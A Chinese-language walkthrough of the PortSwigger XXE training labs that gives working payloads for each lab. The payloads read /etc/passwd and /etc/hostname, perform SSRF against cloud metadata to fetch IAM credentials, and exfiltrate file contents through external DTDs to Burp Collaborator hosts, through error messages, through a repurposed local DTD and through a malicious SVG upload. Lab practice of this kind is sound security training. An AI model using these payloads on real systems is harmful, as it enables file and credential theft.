# XXE PortSwigger靶场通关笔记

> 靶场链接：https://portswigger.net/web-security/all-labs
>
> 该靶场通关笔记仅仅只是 Port Swigger 靶场的 XXE 部分通关记录，相关的漏洞原理我已全部整理出来放在 [Github链接](WowBigBug/XXE.md at main · shungli923/WowBigBug (github.com)) 处。若是对实验过程中涉及到的原理不明白的师傅们欢迎点击链接自助学习。

## Lab: Exploiting XXE using external entities to retrieve files

点击 Access the lab

![image-20221104093147859](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221104093147859.png)

网页内容比较简单，将网页功能流程走完一遍后查看数据包内容（要是网页功能复杂就一个功能点走完后再查看数据包）。这里发现在 `product/stock` 路径下的数据包内容使用了XML文档，把这个包发到Repeater模块，尝试XXE攻击

![image-20221104093442675](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221104093442675.png)

构造一个xml 实体，然后进行利用：payload如下：

```xml-dtd
<!DOCTYPE foo [  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
```

经过实验之后，发现在 `productId`参数下可以通过xxe读取敏感文件内容。

![image-20221104094421151](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221104094421151.png)

**第一关完成！**

## Lab: Exploiting XXE to perform SSRF attacks

点击 Access the lab。根据题目提示信息。这里是需要通过被操作的靶场机器获取到 `http://169.254.169.254`这条服务器的敏感信息

![image-20221104101204053](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221104101204053.png)

使用以下payload：

```xml-dtd
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254">]>
```

看返回包此时返回了该目标下的目录内容

![image-20221104101709873](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221104101709873.png)

将返回目录信息添加在实体信息后，一层层目录递进后，成功获取到目标机器的敏感信息。实体的最终payload信息如下：

```xml-dtd
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
```



![image-20221104101844857](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221104101844857.png)

**第二关完成！**

## Lab: Blind XXE with out-of-band interaction

点击 `Access the lab`,根据提示，此处根据提示需要我们使用burp 自带的dnslog 服务器。

![image-20221105204508300](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221105204508300.png)

（一）：如何使用burp自带的dnslog服务器？

进入 `Burp Suite` 后依次点击坐上角菜单栏里的Burp —> Burp Collaborator client

![image-20221105204739846](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221105204739846.png)

如下图：点击`1`处按件即可得到一个子域名，将该子域名放入构造的payload中，payload触发后点击`2`处按钮即可查询相应dnslog服务器查看是否攻击成功 

![image-20221105204930687](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221105204930687.png)

（二）靶场

简单测试功能看数据包发现在该路径下有使用XML文档，尝试进行XXE攻击，开始尝试读取文件，失败。payload如下：

```xml-dtd
<!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd" >]>
```

![image-20221105205530778](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221105205530778.png)

尝试进行Blind XXE，发送构造的 payload 数据包后：payload如下：

```xml-dtd
<!DOCTYPE ANY[ <!ENTITY content SYSTEM "http://143mat2zjr0qvspmlpaltjdssejka8z.burpcollaborator.net">]>
```

![image-20221105205709821](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221105205709821.png)

去burp查询：点击查询，得到回显，请求被成功发出。

![image-20221105205817211](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221105205817211.png)

**通关成功！**

## Lab: Blind XXE with out-of-band interaction via XML parameter entities

看提示就知道一样的，提示说是需要用到参数实体。

![image-20221105210245434](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221105210245434.png)

老规矩，正常流程走完，发现某接口下使用了XML，进行xxe尝试：

![image-20221105210601873](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221105210601873.png)

直接转到repeater模块构造payload尝试，先尝试读取文件：很明显，外部实体被禁用。payload如下：

```xml-dtd
<!DOCTYPE ANY [  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
```

![image-20221105210744411](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221105210744411.png)

尝试进行Blind XXE，依然无果（其实上面的提示都说明了没办法用实体的，所以Blind XXE不行）。

```dtd
<!DOCTYPE ANY[ <!ENTITY content SYSTEM "http://gg0y………………10pp.burpcollaborator.net">]>
```

![image-20221105210916378](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221105210916378.png)

键都点烂了还是没消息，在预料之内，不用等了。

![image-20221105211058859](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221105211058859.png)

开始尝试参数实体，如下图发现相应包说解析出错。

```dtd
<!DOCTYPE foo[ <!ENTITY % xxe SYSTEM "http://dubsfef………………mlaq.burpcollaborator.net">]>
```

![image-20221105212023587](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221105212023587.png)

去burp里看看，成功触发payload。

![image-20221105212049218](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221105212049218.png)

**通关成功！**

## Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD

老规矩，先进入相应实验模块内：

![image-20221106192745348](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221106192745348.png)

简单测一下，就可以发现外部实体被禁用：payload如下：

```dtd
<!DOCTYPE foo [  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
```

![image-20221106194144579](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221106194144579.png)

尝试使用参数实体看看：payload如下：看响应包也不行。

```dtd
<!DOCTYPE foo[ <!ENTITY % xxe SYSTEM "http://lxmvmq2s0oih7991wcsmgxskgbm1aq.burpcollaborator.net.net">]>
```

![image-20221106194849241](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221106194849241.png)

**都不行，下面开始骚操作：**

在这里生成一个利用的链接：

![image-20221106195217455](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221106195217455.png)



然后找到一个第三方的工具，这里实验环境下已经提供直接使用便可：

![image-20221106195034173](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221106195034173.png)

下面构造攻击包内容，将刚刚生成的利用链接填入对应地方。payload如下：

```dtd
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://4kpe99pbn750uswkjvf53gf33u9mxb.burpcollaborator.net?x=%file;'>">
%eval;
%exfil;
```

![image-20221106195500199](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221106195500199.png)

接下来保存该url：我保存的如下：

```
https://exploit-0ab400d4049a60c4c04a1402018500d7.exploit-server.net/exploit
```

![image-20221106195536455](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221106195536455.png)在repeater模块里构造payload，将发起请求看响应包跟先前的不太一样，检查dnslog是否有记录发现存在记录，其中http的记录里发现了目标 `hostname` 信息

![image-20221106200123728](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221106200123728.png)



将该信息发送到后台，判断实验结果是否正确，得到结果是显然正确的。

![image-20221106200528775](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221106200528775.png)

输入记录内容：

![image-20221106200610162](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221106200610162.png)



可以看见：

![image-20221106200617490](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221106200617490.png)

**成功通关！**

这一关的原理有点绕，要是不明白的师傅们可以在

[这里查看原理]: https://github.com/shungli923/WowBigBug/blob/main/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/XXE.md	"点击"

。

## Lab: Exploiting blind XXE to retrieve data via error messages

进入实验环境，从官方提示可以知道，注入XML语句后结果不会回显，并且需要使用到第三方的服务器。进入后一番简单的抓包发现目标页面：

![image-20221108093644748](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221108093644748.png)

点击此处进入官方提供的第三方利用服务器

![image-20221108093735349](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221108093735349.png)

构造好payload并点击 view exploit 保存该URL地址：payload 如下：

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```



 

![image-20221108093936501](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221108093936501.png)

进入burp可利用功能点处抓的包，然后输入构造好的payload：可以看见结果被包含在了错误信息中显示在屏幕上。payload如下：

```dtd
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```



![image-20221108094150815](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221108094150815.png)

**通关成功**

## Lab: Exploiting XInclude to retrieve files

根据官方提示在一个“Check stock”功能处，它将用户输入数据嵌入到服务器端XML文档中，然后进行解析。或许在这可以进行XXE攻击

![image-20221108092131365](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221108092131365.png)

成功找到该功能点，讲真要不是官方提示，这里很难看出有XXE了吧

![image-20221108092456934](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221108092456934.png)

测试后发现一般的XXE攻击显然不凑效。尝试xinclude：成功读取到目标内容。

![image-20221108093054255](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221108093054255.png)

**实际上在测试过程中，当发现我们可控xml文本内容，但是引入外部实体无效或是存在过滤，尝试编码绕过也不行的时候，那么可以尝试使用xinclude**

**通关成功！**

## Lab: Exploiting XXE via image file upload

简单看一下要求，就是说在上传图片的地方也可以使用XXE攻击，因为 SVG 图像格式也含有xml内容，而一般 SVG 图像格式不被后端所拦截。

![image-20221108160428327](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221108160428327.png)

先创建一个svg图像包含以下payload：然后在评论区上传该svg文件：

```dtd
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

![image-20221108162155764](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221108162155764.png)

burp拦截后一包一包的放行出现如下界面：需要注意的是直接上传不用burp拦截一下不会成功。

![image-20221108162235603](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221108162235603.png)

帖子的评论区出现刚刚提交的评论

![image-20221108162457302](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221108162457302.png)

查看头像内容，便是请求的hostname的值，即为目标内容：

![image-20221108162645830](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221108162645830.png)





点击后输入并提交相应内容。

![image-20221108160641599](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221108160641599.png)

**成功通关！**

![image-20221108162751235](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221108162751235.png)



## Lab: Exploiting XXE to retrieve data by repurposing a local DTD

根据提示，这个靶场需要用到服务器本地的dtd文件：

![image-20221108163416762](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221108163416762.png)

浏览功能点后定位到可能存在xxe的数据包，发到repeater模块构造payload发起进攻！payload如下：

```dtd
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

成功获取到目标文件内容

![image-20221108163702636](https://raw.githubusercontent.com/shungli923/PicGoImg/master/image-20221108163702636.png)

**通关成功！**